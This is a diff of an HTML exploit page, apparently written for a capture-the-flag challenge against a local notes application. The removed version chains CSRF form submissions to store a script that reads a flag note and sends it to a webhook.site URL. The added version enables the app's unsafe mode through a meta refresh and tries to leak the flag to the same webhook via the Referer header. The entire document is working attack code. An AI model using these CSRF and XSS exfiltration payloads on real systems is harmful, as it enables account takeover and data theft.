@@ -1,37 +1,10 @@
-<!doctype html>
 <html>
-<body>
-  <!-- 1) CSRF: create note #2 containing our XSS payload -->
-  <form id="mk" action="http://127.0.0.1:7189/dashboard" method="POST">
-    <input type="hidden" name="content" value='
-      <script>
-      (async ()=>{
-        // same-origin fetch of the flag note
-        const res = await fetch("/notes/1");
-        const txt = await res.text();
-        const flag = /UMCS\{[^}]+\}/.exec(txt)[0];
-        // exfil
-        new Image().src="https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?f="+encodeURIComponent(flag);
-      })();
-      </script>
-    '>
-  </form>
-
-  <!-- 2) CSRF: flip “unsafe” on for note #2 -->
-  <form id="us" action="http://127.0.0.1:7189/prefs/unsafe" method="POST">
-    <input type="hidden" name="id"    value="2">
-    <input type="hidden" name="enable" value="1">
-  </form>
-
-  <script>
-    // kick off: create → wait → enable → wait → view
-    document.getElementById("mk").submit();
-    setTimeout(()=>{
-      document.getElementById("us").submit();
-    }, 3000);
-    setTimeout(()=>{
-      window.location = "http://127.0.0.1:7189/notes/2";
-    }, 6000);
-  </script>
-</body>
+  <head>
+    <!-- STEP 1: Enable Unsafe Mode for note ID=1 -->
+    <meta http-equiv="refresh" content="0; url=http://127.0.0.1:7189/prefs/unsafe?id=1&enable=1" />
+  </head>
+  <body>
+    <!-- STEP 2: Redirect to the note and leak flag via Referer -->
+    <img src="https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0" onerror="location.href='http://127.0.0.1:7189/notes/1'" />
+  </body>
 </html>
